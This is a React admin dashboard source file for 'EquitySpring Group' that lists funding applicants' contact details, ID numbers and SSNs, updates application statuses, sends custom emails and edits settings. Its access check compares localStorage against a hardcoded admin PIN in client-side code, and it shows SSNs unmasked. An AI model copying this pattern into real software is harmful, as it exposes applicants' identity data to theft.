import { useEffect, useState } from "react";
import { useNavigate } from "react-router";
import { trpc } from "@/providers/trpc";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogFooter,
  DialogClose,
} from "@/components/ui/dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Users,
  Mail,
  Clock,
  CheckCircle2,
  AlertCircle,
  LogOut,
  Search,
  Send,
  Eye,
  Settings,
  ChevronLeft,
  ChevronRight,
} from "lucide-react";

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [searchTerm, setSearchTerm] = useState("");
  const [emailSubject, setEmailSubject] = useState("");
  const [emailBody, setEmailBody] = useState("");
  const [sendTo, setSendTo] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 10;

  useEffect(() => {
    const storedPin = localStorage.getItem("adminPin");
    if (!storedPin || storedPin !== "32074319680") {
      navigate("/admin");
      return;
    }
    setPin(storedPin);
  }, [navigate]);

  const { data: applications, isLoading } = trpc.application.list.useQuery(
    { pin },
    { enabled: !!pin }
  );

  const emailMutation = trpc.email.sendAdminCustom.useMutation({
    onSuccess: () => {
      setEmailSubject("");
      setEmailBody("");
      setSendTo("");
    },
  });

  const statusMutation = trpc.application.updateStatus.useMutation();

  const handleLogout = () => {
    localStorage.removeItem("adminPin");
    navigate("/admin");
  };

  const handleSendEmail = () => {
    if (!emailSubject || !emailBody || !sendTo) return;
    emailMutation.mutate({
      pin,
      to: sendTo,
      subject: emailSubject,
      body: emailBody,
    });
  };

  const handleStatusChange = (id: number, status: string) => {
    statusMutation.mutate({ pin, id, status });
  };

  const openEmailDialog = (app: any) => {
    setSendTo(app.email);
    setEmailSubject(`Your Funding Application Status - EquitySpring Group`);
    setEmailBody(
      `Dear Applicant,\n\nThank you for your interest in EquitySpring Group funding.\n\nWe have reviewed your application for ${app.amount} and would like to update you on your status.\n\nPlease contact us at support@equityspringgroup.com for more information.\n\nBest regards,\nThe EquitySpring Group Team`
    );
  };

  const filteredApps =
    applications?.filter((app) => {
      const term = searchTerm.toLowerCase();
      return (
        app.email.toLowerCase().includes(term) ||
        app.phone.toLowerCase().includes(term) ||
        app.occupation.toLowerCase().includes(term) ||
        app.amount.toLowerCase().includes(term) ||
        app.status.toLowerCase().includes(term)
      );
    }) ?? [];

  const totalPages = Math.ceil(filteredApps.length / itemsPerPage);
  const paginatedApps = filteredApps.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  const stats = {
    total: applications?.length ?? 0,
    pending:
      applications?.filter((a) => a.status === "pending").length ?? 0,
    approved:
      applications?.filter((a) => a.status === "approved").length ?? 0,
    rejected:
      applications?.filter((a) => a.status === "rejected").length ?? 0,
  };

  if (!pin) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center">
        <div className="text-white">Loading...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#0a0a0a] py-4 px-4 md:px-8">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img
              src="/logo.png"
              alt="EquitySpring Group"
              className="h-10 w-10 object-contain"
            />
            <div>
              <span className="text-white font-bold text-lg tracking-wide">
                EquitySpring Group
              </span>
              <span className="text-gray-500 text-sm ml-3">Admin Dashboard</span>
            </div>
          </div>
          <Button
            variant="ghost"
            onClick={handleLogout}
            className="text-gray-400 hover:text-white hover:bg-white/10"
          >
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 md:px-8 py-8">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <StatCard
            icon={<Users className="w-5 h-5 text-blue-500" />}
            label="Total Applications"
            value={stats.total}
            bgColor="bg-blue-50"
          />
          <StatCard
            icon={<Clock className="w-5 h-5 text-yellow-500" />}
            label="Pending Review"
            value={stats.pending}
            bgColor="bg-yellow-50"
          />
          <StatCard
            icon={<CheckCircle2 className="w-5 h-5 text-green-500" />}
            label="Approved"
            value={stats.approved}
            bgColor="bg-green-50"
          />
          <StatCard
            icon={<AlertCircle className="w-5 h-5 text-red-500" />}
            label="Rejected"
            value={stats.rejected}
            bgColor="bg-red-50"
          />
        </div>

        <Tabs defaultValue="applications" className="space-y-6">
          <TabsList className="bg-white border">
            <TabsTrigger
              value="applications"
              className="data-[state=active]:bg-[#0a0a0a] data-[state=active]:text-white"
            >
              <Users className="w-4 h-4 mr-2" />
              Applications
            </TabsTrigger>
            <TabsTrigger
              value="email"
              className="data-[state=active]:bg-[#0a0a0a] data-[state=active]:text-white"
            >
              <Mail className="w-4 h-4 mr-2" />
              Send Custom Email
            </TabsTrigger>
            <TabsTrigger
              value="settings"
              className="data-[state=active]:bg-[#0a0a0a] data-[state=active]:text-white"
            >
              <Settings className="w-4 h-4 mr-2" />
              Settings
            </TabsTrigger>
          </TabsList>

          {/* Applications Tab */}
          <TabsContent value="applications">
            <div className="bg-white rounded-lg shadow-sm border">
              <div className="p-4 border-b flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <h2 className="font-semibold text-gray-900">
                  Funding Applications
                </h2>
                <div className="relative max-w-xs">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
                  <Input
                    placeholder="Search applications..."
                    value={searchTerm}
                    onChange={(e) => {
                      setSearchTerm(e.target.value);
                      setCurrentPage(1);
                    }}
                    className="pl-10"
                  />
                </div>
              </div>

              {isLoading ? (
                <div className="p-8 text-center text-gray-500">
                  Loading applications...
                </div>
              ) : filteredApps.length === 0 ? (
                <div className="p-8 text-center text-gray-500">
                  {searchTerm
                    ? "No applications match your search."
                    : "No applications yet."}
                </div>
              ) : (
                <>
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead className="w-[60px]">ID</TableHead>
                          <TableHead>Amount</TableHead>
                          <TableHead>Email</TableHead>
                          <TableHead>Phone</TableHead>
                          <TableHead>Occupation</TableHead>
                          <TableHead>House</TableHead>
                          <TableHead>Status</TableHead>
                          <TableHead>Date</TableHead>
                          <TableHead className="text-right">Actions</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {paginatedApps.map((app) => (
                          <TableRow key={app.id}>
                            <TableCell className="font-medium">
                              #{app.id}
                            </TableCell>
                            <TableCell>{app.amount}</TableCell>
                            <TableCell className="max-w-[180px] truncate">
                              {app.email}
                            </TableCell>
                            <TableCell>{app.phone}</TableCell>
                            <TableCell>{app.occupation}</TableCell>
                            <TableCell>
                              {app.hasHouse ? "Yes" : "No"}
                            </TableCell>
                            <TableCell>
                              <Select
                                value={app.status}
                                onValueChange={(val) =>
                                  handleStatusChange(app.id, val)
                                }
                              >
                                <SelectTrigger className="w-[120px] h-8 text-xs">
                                  <SelectValue />
                                </SelectTrigger>
                                <SelectContent>
                                  <SelectItem value="pending">
                                    Pending
                                  </SelectItem>
                                  <SelectItem value="approved">
                                    Approved
                                  </SelectItem>
                                  <SelectItem value="rejected">
                                    Rejected
                                  </SelectItem>
                                  <SelectItem value="reviewing">
                                    Reviewing
                                  </SelectItem>
                                </SelectContent>
                              </Select>
                            </TableCell>
                            <TableCell className="text-xs text-gray-500 whitespace-nowrap">
                              {app.createdAt
                                ? new Date(app.createdAt).toLocaleDateString()
                                : "N/A"}
                            </TableCell>
                            <TableCell className="text-right">
                              <div className="flex items-center justify-end gap-2">
                                <Dialog>
                                  <DialogTrigger asChild>
                                    <Button
                                      variant="ghost"
                                      size="sm"
                                      className="h-8 w-8 p-0"
                                      onClick={() => {}}
                                    >
                                      <Eye className="w-4 h-4 text-gray-500" />
                                    </Button>
                                  </DialogTrigger>
                                  <DialogContent className="max-w-lg max-h-[80vh] overflow-y-auto">
                                    <DialogHeader>
                                      <DialogTitle>
                                        Application #{app.id} Details
                                      </DialogTitle>
                                    </DialogHeader>
                                    <div className="space-y-3 pt-4">
                                      <DetailRow label="Amount" value={app.amount} />
                                      <DetailRow label="Email" value={app.email} />
                                      <DetailRow label="Phone" value={app.phone} />
                                      <DetailRow
                                        label="Occupation"
                                        value={app.occupation}
                                      />
                                      <DetailRow
                                        label="ID Number"
                                        value={app.idNumber}
                                      />
                                      <DetailRow label="SSN" value={app.ssn} />
                                      <DetailRow
                                        label="Has House"
                                        value={app.hasHouse ? "Yes" : "No"}
                                      />
                                      <DetailRow
                                        label="Reason"
                                        value={app.reason}
                                      />
                                      <DetailRow
                                        label="Status"
                                        value={app.status}
                                      />
                                      <DetailRow
                                        label="Submitted"
                                        value={
                                          app.createdAt
                                            ? new Date(
                                                app.createdAt
                                              ).toLocaleString()
                                            : "N/A"
                                        }
                                      />
                                    </div>
                                  </DialogContent>
                                </Dialog>

                                <Dialog>
                                  <DialogTrigger asChild>
                                    <Button
                                      variant="ghost"
                                      size="sm"
                                      className="h-8 w-8 p-0"
                                      onClick={() => openEmailDialog(app)}
                                    >
                                      <Mail className="w-4 h-4 text-[#c9a84c]" />
                                    </Button>
                                  </DialogTrigger>
                                  <DialogContent className="max-w-lg">
                                    <DialogHeader>
                                      <DialogTitle>
                                        Send Custom Email
                                      </DialogTitle>
                                    </DialogHeader>
                                    <div className="space-y-4 pt-4">
                                      <div>
                                        <Label className="text-sm">
                                          To
                                        </Label>
                                        <Input
                                          value={sendTo}
                                          onChange={(e) =>
                                            setSendTo(e.target.value)
                                          }
                                          className="mt-1"
                                        />
                                      </div>
                                      <div>
                                        <Label className="text-sm">
                                          Subject
                                        </Label>
                                        <Input
                                          value={emailSubject}
                                          onChange={(e) =>
                                            setEmailSubject(e.target.value)
                                          }
                                          className="mt-1"
                                        />
                                      </div>
                                      <div>
                                        <Label className="text-sm">
                                          Message
                                        </Label>
                                        <Textarea
                                          value={emailBody}
                                          onChange={(e) =>
                                            setEmailBody(e.target.value)
                                          }
                                          className="mt-1 min-h-[200px]"
                                        />
                                      </div>
                                    </div>
                                    <DialogFooter>
                                      <DialogClose asChild>
                                        <Button variant="outline">Cancel</Button>
                                      </DialogClose>
                                      <DialogClose asChild>
                                        <Button
                                          onClick={handleSendEmail}
                                          disabled={emailMutation.isPending}
                                          className="bg-[#c9a84c] hover:bg-[#b8943d] text-[#0a0a0a]"
                                        >
                                          <Send className="w-4 h-4 mr-2" />
                                          {emailMutation.isPending
                                            ? "Sending..."
                                            : "Send Email"}
                                        </Button>
                                      </DialogClose>
                                    </DialogFooter>
                                  </DialogContent>
                                </Dialog>
                              </div>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>

                  {/* Pagination */}
                  {totalPages > 1 && (
                    <div className="p-4 border-t flex items-center justify-between">
                      <p className="text-sm text-gray-500">
                        Showing{" "}
                        {(currentPage - 1) * itemsPerPage + 1} -{" "}
                        {Math.min(
                          currentPage * itemsPerPage,
                          filteredApps.length
                        )}{" "}
                        of {filteredApps.length}
                      </p>
                      <div className="flex items-center gap-2">
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() =>
                            setCurrentPage((p) => Math.max(1, p - 1))
                          }
                          disabled={currentPage === 1}
                        >
                          <ChevronLeft className="w-4 h-4" />
                        </Button>
                        <span className="text-sm text-gray-600 px-2">
                          {currentPage} / {totalPages}
                        </span>
                        <Button
                          variant="outline"
                          size="sm"
                          onClick={() =>
                            setCurrentPage((p) =>
                              Math.min(totalPages, p + 1)
                            )
                          }
                          disabled={currentPage === totalPages}
                        >
                          <ChevronRight className="w-4 h-4" />
                        </Button>
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>
          </TabsContent>

          {/* Send Custom Email Tab */}
          <TabsContent value="email">
            <div className="bg-white rounded-lg shadow-sm border p-6">
              <h2 className="font-semibold text-gray-900 mb-6">
                Send Custom Approval Email
              </h2>
              <div className="max-w-xl space-y-4">
                <div>
                  <Label className="text-sm">Recipient Email</Label>
                  <Input
                    placeholder="client@example.com"
                    value={sendTo}
                    onChange={(e) => setSendTo(e.target.value)}
                    className="mt-1"
                  />
                </div>
                <div>
                  <Label className="text-sm">Subject</Label>
                  <Input
                    placeholder="Your Funding Application Status"
                    value={emailSubject}
                    onChange={(e) => setEmailSubject(e.target.value)}
                    className="mt-1"
                  />
                </div>
                <div>
                  <Label className="text-sm">Message</Label>
                  <Textarea
                    placeholder="Write your custom message here..."
                    value={emailBody}
                    onChange={(e) => setEmailBody(e.target.value)}
                    className="mt-1 min-h-[250px]"
                  />
                </div>
                <Button
                  onClick={handleSendEmail}
                  disabled={emailMutation.isPending}
                  className="bg-[#c9a84c] hover:bg-[#b8943d] text-[#0a0a0a]"
                >
                  <Send className="w-4 h-4 mr-2" />
                  {emailMutation.isPending ? "Sending..." : "Send Email"}
                </Button>
              </div>
            </div>
          </TabsContent>

          {/* Settings Tab */}
          <TabsContent value="settings">
            <SettingsTab pin={pin} />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}

function StatCard({
  icon,
  label,
  value,
  bgColor,
}: {
  icon: React.ReactNode;
  label: string;
  value: number;
  bgColor: string;
}) {
  return (
    <div className="bg-white rounded-lg shadow-sm border p-5 flex items-center gap-4">
      <div
        className={`w-12 h-12 ${bgColor} rounded-lg flex items-center justify-center flex-shrink-0`}
      >
        {icon}
      </div>
      <div>
        <p className="text-2xl font-bold text-gray-900">{value}</p>
        <p className="text-sm text-gray-500">{label}</p>
      </div>
    </div>
  );
}

function DetailRow({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex justify-between items-start gap-4 py-2 border-b border-gray-100 last:border-0">
      <span className="text-sm text-gray-500 font-medium min-w-[100px]">
        {label}
      </span>
      <span className="text-sm text-gray-900 text-right break-all">
        {value}
      </span>
    </div>
  );
}

function SettingsTab({ pin }: { pin: string }) {
  const { data: allSettings } = trpc.settings.getAll.useQuery(
    { pin },
    { enabled: !!pin }
  );
  const setMutation = trpc.settings.set.useMutation();
  const utils = trpc.useUtils();

  const [newKey, setNewKey] = useState("");
  const [newValue, setNewValue] = useState("");
  const [editing, setEditing] = useState<Record<string, string>>({});

  const handleSave = (key: string) => {
    setMutation.mutate(
      { pin, key, value: editing[key] },
      {
        onSuccess: () => {
          utils.settings.getAll.invalidate();
          setEditing((prev) => {
            const next = { ...prev };
            delete next[key];
            return next;
          });
        },
      }
    );
  };

  const handleAddNew = () => {
    if (!newKey || !newValue) return;
    setMutation.mutate(
      { pin, key: newKey, value: newValue },
      {
        onSuccess: () => {
          utils.settings.getAll.invalidate();
          setNewKey("");
          setNewValue("");
        },
      }
    );
  };

  return (
    <div className="bg-white rounded-lg shadow-sm border p-6">
      <h2 className="font-semibold text-gray-900 mb-6">Form Settings</h2>

      <div className="space-y-4 mb-8">
        <h3 className="text-sm font-medium text-gray-700">Add New Setting</h3>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Input
            placeholder="Setting key (e.g. min_amount)"
            value={newKey}
            onChange={(e) => setNewKey(e.target.value)}
          />
          <Input
            placeholder="Setting value"
            value={newValue}
            onChange={(e) => setNewValue(e.target.value)}
          />
          <Button
            onClick={handleAddNew}
            disabled={setMutation.isPending}
            className="bg-[#0a0a0a] hover:bg-[#333]"
          >
            Add Setting
          </Button>
        </div>
      </div>

      <div className="space-y-3">
        <h3 className="text-sm font-medium text-gray-700">Current Settings</h3>
        {(!allSettings || allSettings.length === 0) ? (
          <p className="text-gray-500 text-sm">
            No settings configured yet.
          </p>
        ) : (
          <div className="space-y-2">
            {allSettings.map((setting) => (
              <div
                key={setting.id}
                className="flex items-center gap-4 p-3 bg-gray-50 rounded-lg"
              >
                <div className="flex-1 min-w-0">
                  <p className="text-xs text-gray-500 font-medium uppercase">
                    {setting.key}
                  </p>
                  {editing[setting.key] !== undefined ? (
                    <Input
                      value={editing[setting.key]}
                      onChange={(e) =>
                        setEditing((prev) => ({
                          ...prev,
                          [setting.key]: e.target.value,
                        }))
                      }
                      className="mt-1 h-8 text-sm"
                    />
                  ) : (
                    <p className="text-sm text-gray-900 truncate">
                      {setting.value}
                    </p>
                  )}
                </div>
                <div className="flex items-center gap-2 flex-shrink-0">
                  {editing[setting.key] !== undefined ? (
                    <>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleSave(setting.key)}
                        className="h-8 text-green-600 hover:text-green-700 hover:bg-green-50"
                      >
                        Save
                      </Button>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() =>
                          setEditing((prev) => {
                            const next = { ...prev };
                            delete next[setting.key];
                            return next;
                          })
                        }
                        className="h-8 text-gray-500"
                      >
                        Cancel
                      </Button>
                    </>
                  ) : (
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        setEditing((prev) => ({
                          ...prev,
                          [setting.key]: setting.value,
                        }))
                      }
                      className="h-8 text-[#c9a84c] hover:text-[#b8943d] hover:bg-[#c9a84c]/10"
                    >
                      Edit
                    </Button>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
